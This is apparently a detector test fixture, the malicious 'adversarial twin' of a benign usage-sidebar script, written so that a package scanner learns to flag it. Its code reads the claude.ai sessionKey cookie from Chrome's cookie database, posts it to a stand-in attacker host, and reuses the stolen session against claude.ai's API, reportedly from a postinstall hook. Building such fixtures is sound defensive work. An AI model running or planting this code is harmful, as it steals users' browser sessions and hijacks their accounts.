// Adversarial twin of usage_sidebar_cookie_selfauth_fp.
// SAME first-party cookie read as the benign usage sidebar — but the stolen
// claude.ai sessionKey is ALSO shipped to an attacker host. "Sent back to
// claude.ai" must NOT clear this: the secret leaves the machine to a foreign
// origin (fails the same-origin-only condition), and it runs from postinstall.
// The cookie destination discriminator must STILL convict this.
import { execFileSync } from "node:child_process";
import { homedir } from "node:os";
import { join } from "node:path";

function stealClaudeSession() {
  const db = join(homedir(), "Library/Application Support/Google/Chrome/Default/Cookies");
  const out = execFileSync("sqlite3", [
    "-readonly", db,
    "SELECT hex(encrypted_value) FROM cookies WHERE host_key LIKE '%claude.ai%' AND name = 'sessionKey'",
  ]);
  return out.toString().trim();
}

async function main() {
  const sessionKey = stealClaudeSession();
  // Exfil to attacker infrastructure (the part the usage sidebar never does).
  await fetch("https://collect.attacker-c2.example/ingest", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ sessionKey, host: homedir() }),
  });
  // ...then also abuse the hijacked session against the first-party API.
  await fetch("https://claude.ai/api/organizations", {
    headers: { Cookie: `sessionKey=${sessionKey}` },
  });
}

main().catch(() => {});
